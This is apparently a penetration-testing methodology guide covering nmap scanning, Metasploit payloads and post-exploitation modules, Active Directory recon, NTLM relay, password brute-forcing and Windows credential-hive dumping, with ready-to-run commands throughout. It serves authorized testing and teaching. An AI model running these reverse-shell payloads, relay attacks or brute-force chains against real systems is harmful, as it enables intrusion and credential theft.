# Network & Infrastructure Security Testing

Full testing flow for external/internal network and infrastructure engagements - host discovery, port/service scanning, enumeration (Nmap NSE), vulnerability scanning, exploitation (Metasploit), Active Directory attacks, password cracking, pivoting/post-exploitation, and cloud/wireless pointers. Tool inventory in [tools-reference.md](tools-reference.md); engagement lifecycle/CVSS/reporting in [sdlc-security-testing.md](sdlc-security-testing.md); web/API surface in [web-security-testing.md](web-security-testing.md). Use only on authorized targets.

---

## 1. Methodology
External (internet-facing) and internal (post-breach/insider) network testing, aligned to PTES: pre-engagement/scope -> recon (passive OSINT + active scanning) -> threat modeling -> vulnerability analysis -> exploitation -> post-exploitation (privesc, lateral movement, data-access proof) -> reporting -> remediation/retest. Typical kit: **nmap** (scanning), **gobuster/ffuf/feroxbuster** (web enum), **Burp** (web proxy), **netcat** (shells), **Metasploit** (exploitation), **linpeas/winpeas** (privesc enum), **hashcat/john** (cracking). Check for recent in-the-wild critical CVEs against the target stack before/while testing.

---

## 2. Host discovery & port scanning (Nmap)
Default `nmap <host>` is a TCP connect scan of common ports. Solid default: `nmap -sS -sVC -T4 --open <host>`.
```bash
nmap -sn <subnet>                     # ping sweep (host discovery)
nmap -sn -PR <subnet>                 # ARP (stealthiest/reliable on local LAN)
nmap -sn -PS <subnet>                 # TCP SYN discovery (bypass ICMP filters)
nmap -sn -PP <subnet>                 # ICMP timestamp (often firewall-blocked)
nmap -sC -sV <host>                   # default scripts + service/version
nmap -T4 -A -v <host>                 # aggressive: OS, services, scripts (noisy)
nmap -p- -sVC <host> -oN full.txt     # all ports
```
**Scan types:** `-sT` connect/full-open (completes 3-way handshake; not stealthy); `-sS` SYN/half-open (SYN -> RST before handshake; stealthier); inverse-flag `-sX`/`-sF`/`-sN`/Maimon (malformed flags to confuse firewalls/IDS); `-sA` ACK (firewall rule mapping, not host discovery); `-sI` idle/IPID (zombie host spoofs source - extremely stealthy); `-sU` UDP; `-sV` versions; `-O` OS; `-sC` default scripts.

---

## 3. Service enumeration - Nmap Scripting Engine (NSE)
```bash
# OS / NetBIOS / SNMP
nmap --script smb-os-discovery.nse <host>
nmap -p 137,138,139 --script nbstat.nse <host>
nmap -p 161 --script snmp-info <host>              # also snmp-processes, snmp-sysdescr, snmp-win32-software
# LDAP / NTP / NFS
nmap -p 389 --script ldap-rootdse <host>
nmap -p 389 --script ldap-brute --script-args ldap.base='"cn=users,dc=CEH,dc=com"' <host>
nmap -p 123 --script ntp-info <host>               # ntp-version, ntp-monlist (amplification)
nmap -p 2049 --script nfs-showmount <host>
# SMTP
nmap -p 25,365,587 --script smtp-commands <host>
nmap -p 25 --script smtp-open-relay <host>
nmap -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY,EXPN,RCPT} <host>
# DNS
nmap --script broadcast-dns-service-discovery <host>
nmap -T4 -p 53 --script dns-brute <host>           # subdomains
nmap -Pn -sU -p 53 --script dns-recursion <host>
nmap -sU -p 53 --script dns-nsec-enum --script-args dns-nsec-enum.domains=<sub> <host>
nmap -p 53 --script dns-zone-transfer <host>
# IPsec / SMB / SSH / FTP
nmap -sU -p 500 --script ike-version <host>
nmap -p 139,445 --script smb-protocols <host>
nmap -p 445 --script smb-enum-shares <host>
nmap --script ssh-brute -p 22 <host>
nmap --script ftp-brute -p 21 <host> ; nmap -p 21 --script ftp-anon <host>
# Web via NSE
nmap -p80 --script http-enum <host>                # common apps
nmap -p80 --script http-userdir-enum <host>        # Apache mod_userdir users
nmap -p80 --script http-waf-detect --script-args http-waf-detect.aggro,http-waf-detect.detectBodyChanges <host>
nmap --script http-waf-fingerprint -p80,443 <host>
nmap -p 80 --script http-trace -d <host>           # TRACE / XST
nmap -p80 --script http-robots.txt <host>
nmap --script http-headers <host>
nmap -sV --script "http-vuln*" <host>
nmap -p80 --script http-passwd --script-args http-passwd.root=/ <host>
# Vulnerability scan
nmap -sV --script vuln <host> -oN vuln.txt
nmap --script sniffer-detect <ip/range>            # NIC promiscuous mode
```

---

## 4. Vulnerability scanning
```bash
nikto -h https://example.com | tee nikto.txt
nuclei -u https://example.com -severity low,medium,high,critical -o nuclei.txt
sudo docker run -d -p 443:443 --name openvas mikesplain/openvas   # OpenVAS
```
Also **Nessus**, **OpenVAS** (full). Treat all scanner output as leads requiring manual validation.

---

## 5. Exploitation - Metasploit
Modules: **payload** (comms channel to victim), **auxiliary** (scanning/DoS/fuzzing), **NOPs** (buffer padding), **encoder** (AV/IDS evasion), **evasion** (modify payloads/exploits to evade detection), **post** (post-exploitation).
```bash
# Auxiliary - enumeration
msfconsole -q -x "use auxiliary/scanner/portscan/tcp; set RHOSTS <ip>; run; exit"
msfconsole -q -x "use auxiliary/scanner/smtp/smtp_version; set RHOSTS <ip>; run; exit"
msfconsole -q -x "use auxiliary/scanner/smtp/smtp_enum; set RHOSTS <ip>; run; exit"
msfconsole -q -x "use auxiliary/scanner/sip/enumerator; set RHOSTS <ip>; run; exit"   # VoIP/SIP
# Evasion
evasion/windows/windows_defender_exe ; evasion/windows/antivirus_disable ; evasion/unix/antivirus_disable
# Post-exploitation
post/windows/gather/enum_logged_on_users
post/windows/gather/credentials/credential_collector
post/linux/gather/enum_configs ; post/linux/gather/hashdump
post/multi/manage/autoroute ; post/windows/manage/portproxy          # pivoting
run post/windows/gather/arp_scanner RHOSTS <subnet>                   # live hosts
# Payloads (msfvenom)
msfvenom -p android/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -o app_payload.apk
msfconsole -q -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST <ip>; set LPORT <port>; exploit"
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o payload.exe
msfvenom -p generic/custom PAYLOADFILE=calc.exe -a x64 --platform windows -f vba-exe   # macro
```

---

## 6. Active Directory

### Concepts
AD is Microsoft's directory service - the central brain of a Windows domain (authenticate/authorize users, control resource access, apply policy, central management). **AD DS** is the core service; everything is stored in `NTDS.dit`.
- **Domain** - logical group of users/computers/servers/policies (`company.local`).
- **Domain Controller (DC)** - runs AD DS; stores accounts/passwords, does Kerberos auth, policies. DC down -> no logins.
- **Forest** - top-level; multiple domains that trust each other. **Tree** - hierarchy of domains. **OU** - container for objects (GPOs apply here). **Objects** - users/groups/computers/printers/service accounts. **Groups** - security (permissions) vs distribution (email). **GPOs** - rules applied to domains/OUs (disable USB, password policy, disable CMD/PowerShell, install software, firewall).

### Authentication
- **Kerberos** (default, secure): TGT + service tickets; terms KDC, AS-REQ/AS-REP, TGS-REQ/TGS-REP.
- **NTLM** (older/less secure): used when Kerberos fails, workgroups, legacy apps.
- Infra terms: AD depends on DNS; Sites (replication control), Subnets (boundaries), AD replication (DC sync), SYSVOL (GPOs/scripts).

### Attack execution -> red team
The adversary TTPs against AD (Kerberoasting, AS-REP roasting,
Pass-the-Hash/Ticket, Golden/Silver ticket, DCSync, delegation/ACL abuse, lateral
movement, domain privilege escalation) are covered in
[red-team-testing.md](red-team-testing.md#5-post-exploitation). This guide stays
on AD enumeration and the infrastructure layer below.

### Ports/services -> attacks
Kerberos 88 (PtT, Kerberoasting) | RPC 135 (lateral movement, DCOM RCE) | NetBIOS 139 (null session, recon) | LDAP 389 (AD object enum) | SMB 445 (EternalBlue, SMB relay, cred theft) | LDAPS 636 (AD CS exploitation).

### Recon & attack tools
- SMB: `smbclient`, `smbmap`, **CrackMapExec**, `nmap --script=smb-enum-shares`, enum4linux/ng. LDAP: `ldapsearch`. RPC: `rpcclient`, enum4linux/ng. Kerberos: `kerbrute`.
- Admin: AD Users & Computers, GPMC, DNS Manager, ADSI Edit, PowerShell.
- Red team: **BloodHound**/**SharpHound**, **Mimikatz**, **Impacket**, CrackMapExec, PingCastle, PowerSploit.
- General infra scanners: Nessus, OpenVAS, BloodHound, Maltego.

---

## 7. Password cracking & secrets
**hashcat** (GPU; `-m` per hash type, e.g. `16500` JWT), **John the Ripper**, **hydra** (online brute: `hydra -l user -P rockyou.txt ssh://<ip>`), steghide (stego extraction), CrypTool/VeraCrypt/BCTextEncoder (crypto/containers). Scan git history with trufflehog/gitleaks; rotate any exposed secret.

---

## 8. Pivoting & post-exploitation
Privesc enumeration with **linpeas**/**winpeas**; AD/Linux LPE/WPE; pivot with Metasploit `autoroute`/`portproxy`, proxychains, SSH tunnels; dump creds (Mimikatz/hashdump); lateral movement (PsExec/WinRM/SMB/RDP). Prove impact within scope only.

### LLMNR / NBT-NS poisoning & NTLM relay (internal)
On a LAN, Windows falls back to broadcast name resolution - **LLMNR** (UDP 5355) and **NBT-NS** (UDP 137) - when DNS fails. Nothing authenticates the responder, so you answer the poisoned request, impersonate the host the victim was looking for, and the victim sends you its NetNTLM authentication. This is often the fastest path from "plugged into the network" to domain credentials.
- **Capture + crack:** `responder -I eth0` -> collect NetNTLMv2 hashes -> crack offline (`hashcat -m 5600`).
- **Relay (no crack needed):** if **SMB signing is not enforced** on the target, relay the captured authentication straight to another host instead of cracking it: `ntlmrelayx.py -t smb://<target> -smb2support` (Impacket) -> command execution or `secretsdump` as the relayed user. Turn off Responder's SMB/HTTP servers when relaying.
- **Fix:** disable LLMNR/NBT-NS via GPO, enforce SMB signing, and use strong passwords (defeats offline cracking).

---

## 9. Windows internals, persistence & forensics artifacts

Windows host attack surface: where credentials and configuration live on disk,
and which native features double as attacker tooling. Useful for both
post-exploitation (loot, persistence, living-off-the-land) and DFIR triage.

### Key directories & registry hives

| Path | Purpose |
| --- | --- |
| `C:\Windows\System32\config\SAM` | Local password hashes (protected by SysKey). |
| `C:\Windows\repair\SAM` | Backup of user credentials (recovery/forensics). |
| `C:\Windows\System32\config\SECURITY` | Local security policies & access-control data. |
| `C:\Windows\System32\config\SOFTWARE` | Registry hive of installed software (malware analysis). |
| `C:\Windows\System32\config\SYSTEM` | System-wide configuration & control settings. |
| `C:\Windows\System32\winevt\*` | Windows Event Logs (threat detection & IR). |
| `C:\Windows\Prefetch\` | App execution traces (forensic timelines). |
| `C:\Windows\AppCompat\Programs\Amcache.hve` | Records executed applications (malware tracking). |
| `C:\Users\*\NTUSER.dat` | Per-user registry hive (often abused for persistence). |
| `C:\Users\*\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` | User-level startup folder (commonly abused by malware). |
| `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup` | All-users startup folder. |
| `C:\Windows\System32\drivers\etc\hosts` | Local DNS mappings (abused for redirection). |
| `C:\Windows\System32\drivers\etc\networks` | Legacy network config (rarely used today). |

Credential/registry hives (SAM, SECURITY, SYSTEM, SOFTWARE) are locked while the
OS runs - dump them offline (shadow copy, `reg save`, or from the mounted disk),
then crack/parse with Impacket `secretsdump.py` or Mimikatz.

### Native features (legitimate use vs attack use)

| Feature | Legitimate use | Attack use |
| --- | --- | --- |
| Registry Run keys / Startup folder | Central store for Windows/system configuration. | Persistence via Run/RunOnce keys or Startup to auto-execute payloads, disable defenses, store malicious config. |
| WMI | Query/manage system info, automation, monitoring. | Persistence via event subscriptions, stealthy command execution, lateral movement. |
| WMIC | CLI to WMI for queries and system management. | Remote command execution, persistence, recon without dropping files. |
| PowerShell | Automation, configuration, admin scripting. | Fileless execution, credential dumping, payload delivery, obfuscation to evade defenses. |
| VB / VBScript | Legacy automation, Office macros, Windows tasks. | Malicious macros, phishing attachments, persistence scripts. |
| Group Policy (GPO) | Centralized config of domain-joined systems. | Push malicious scripts, disable defenses, deploy malware across the domain. |
| AppLocker | Application whitelisting (publisher/path/hash). | Bypass via LOLBins, alternate interpreters, or misconfigurations. |

Cross-refs: domain-wide abuse of GPOs and credential hives ties into Active
Directory attacks (section 6); dumping and reuse of these artifacts is part of
post-exploitation (section 8).

---

## 10. Cloud & wireless (pointers)
- **Cloud:** config/IAM/storage/serverless review with **ScoutSuite**, **Prowler**, **Pacu** (AWS), CloudSploit; public buckets `aws s3 ls s3://<bucket> --no-sign-request`; SSRF -> IMDS credential theft (enforce IMDSv2) - see [web-security-testing.md](web-security-testing.md). Fundamentals (shared responsibility, SG vs NACL, IAM least-privilege) in the preps notes.
- **Wireless:** Wi-Fi/rogue-AP/WPA attacks (scope-dependent).

---

## 11. Practical examples (CEH-style command chains)
Condensed real workflows combining the above:
- FTP: `nmap -p 21 --open <subnet>` -> `hydra -l nick -P rockyou.txt ftp://<ip>` -> login -> `get <file>`.
- Creds in traffic: Wireshark filter `http.request.method == POST` -> inspect login attempts.
- SMB: `nmap -p 139,445 <ip>` -> `hydra -L users.txt -P rockyou.txt <ip> smb` -> `smbclient -L //<ip> -U user` -> mount share -> read files.
- MSSQL: `nmap --script ms-sql* <ip>` -> `hydra -L users -P rockyou.txt <ip> mssql` -> `mssqlclient.py srv:pass@<ip>` -> read files.
- RDP: `nmap -p 3389 -sV --open <subnet>` -> `hydra -l user -P rockyou.txt rdp://<ip>`.
- Web -> SQLi: `sqlmap -u "http://site" --dbs --forms --crawl=2` -> `-D db --tables --count` -> `--dump`.
- Android over ADB: `adb shell pm list packages -f` -> pull APKs -> unzip/extract -> analyze; `adb pull /sdcard/...` for artefacts; PhoneSploit Pro for device shell/dumps.
- Stego/crypto: `steghide extract -sf img.jpeg -p <pass>`; CrypTool for Twofish/AES; VeraCrypt to mount containers; `md5sum`/`Get-FileHash` to compare hashes; Detect It Easy -> entropy.
- Vuln scan: OpenVAS for host CVEs (e.g. "FTP Unencrypted Cleartext Login").

---

## 12. Tools & checklist
**Scan/exploit:** Nmap, Masscan, Metasploit, Nessus, OpenVAS, Nikto, Nuclei, Wireshark, netcat, proxychains, Responder. **AD:** CrackMapExec, BloodHound/SharpHound, Mimikatz, Impacket, enum4linux/ng, ldapsearch, kerbrute, PingCastle. **Cracking:** Hashcat, John, Hydra. **Privesc:** linpeas/winpeas, PowerUp, Seatbelt. **Cloud:** ScoutSuite, Prowler, Pacu. (Full inventory in [tools-reference.md](tools-reference.md).)

**Checklist:**
- [ ] authorization + scope + RoE
- [ ] host discovery + full port scan
- [ ] service/version enumeration (NSE per service)
- [ ] vuln scan (validated manually)
- [ ] default/weak creds, anonymous access, open relays, cleartext protocols
- [ ] SMB/LDAP/SNMP/NFS/DNS enumeration
- [ ] AD recon + attack paths (BloodHound)
- [ ] exploitation to prove impact
- [ ] privesc + lateral movement (in scope)
- [ ] cloud/storage exposure
- [ ] evidence + CVSS + remediation + retest.
